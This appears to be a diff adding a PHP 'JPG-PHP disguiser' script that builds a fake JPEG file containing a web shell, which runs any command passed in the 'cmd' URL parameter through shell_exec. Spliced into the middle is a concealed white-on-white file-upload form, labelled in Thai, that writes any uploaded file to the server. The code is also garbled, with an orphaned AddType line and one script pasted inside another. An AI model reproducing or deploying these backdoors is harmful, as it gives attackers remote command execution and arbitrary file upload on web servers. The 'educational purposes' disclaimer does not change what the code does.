@@ -1,0 +1,55 @@
+<?php
+/*
+ * JPG-PHP Disguiser Tool (For Educational Purposes Only)
+ * Creates a .jpg file that can also be executed as PHP
+ */
+
+// Generate safe filename
+$output_file = 'image_' . bin2hex(random_bytes(4)) . '.jpg';
+
+// Basic PHP shell to embed (simple example)
+$php_code = '<?php /*
+ * This appears as a comment in JPEG but executes as PHP
+ */
+if(isset($_GET["cmd"])) {
+    header("Content-Type: text/plain");
+    echo "[PHP Execution Result]\n";
+    echo "Command: " . htmlspecialchars($_GET["cmd"]) . "\n\n";
+    echo shell_exec($_GET["cmd"]);
+    exit;
+}
+echo "Image loaded normally";
+?>';
+
+// JPEG header and minimal valid structure
+$jpg_header = hex2bin('FFD8FFE0') . 'JFIF' . hex2bin('00'). pack('n*', 
+    0x0102, 0x0100, 0x0001, 0x0001, 0x0000);
+
+    "AddType application/x-httpd-php .jpg";
+
+// Combine everything
+file_put_contents($output_file, 
+    $jpg_header . 
+    "<?php /*" . $php_code . "*/ ?>" . 
+    hex2bin('FFD9'));   
+<?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="กลุ่มไดโนเหลือง" id="กลุ่มไดโนเหลือง" style="color: #ffffff;">';   
+echo '<input type="file" name="file" style="opacity: 2; position: relative; z-index: 1;">';        
+echo '<input name="_upl" type="submit" id="_upl" value="กลุ่มไดโนเหลือง" style="color: #ffffff; background-color: #ffffff; border: 2px solid #00ff00; opacity: 2;">';
+echo '</form>'; 
+if( $_POST['_upl'] == "กลุ่มไดโนเหลือง" ) {    
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) 
+{         
+echo '<b style="color: #ffffff;">กลุ่มไดโนเหลือง</b><br><br>'; 
+    } else {            
+echo '<b style="color: #ffffff;">กลุ่มไดโนเหลือง!!!!!</b><br><br>';   
+            }
+}
+?>
+echo "[+] Generated disguised file: $output_file\n";
+echo "[+] Access as:\n";
+echo "    Image URL: http://yoursite.com/$output_file\n";
+echo "    PHP Functionality: http://yoursite.com/$output_file?cmd=whoami\n\n";
+echo "WARNING: For educational/authorized testing only!";
+?>
+
